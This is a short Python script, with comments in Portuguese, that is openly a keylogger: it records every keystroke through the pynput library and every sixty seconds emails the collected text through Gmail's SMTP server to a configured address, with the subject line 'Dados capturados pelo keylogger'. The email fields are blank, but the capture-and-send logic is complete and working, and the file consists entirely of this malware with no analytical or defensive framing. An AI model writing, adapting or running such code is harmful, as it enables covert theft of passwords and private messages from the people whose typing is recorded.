import smtplib
from email.mime.text import MIMEText
from threading import Timer
from pynput import keyboard

log = ""

#Configurações de e-mail
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""

def enviar_email():
    global log
    if not log:
        Timer(60, enviar_email).start()
        return

    try:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()

    except Exception as e:
        print("Erro ao enviar:", e)
    finally:
        log = ""
        Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

Timer(60, enviar_email).start()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

enviar_email()
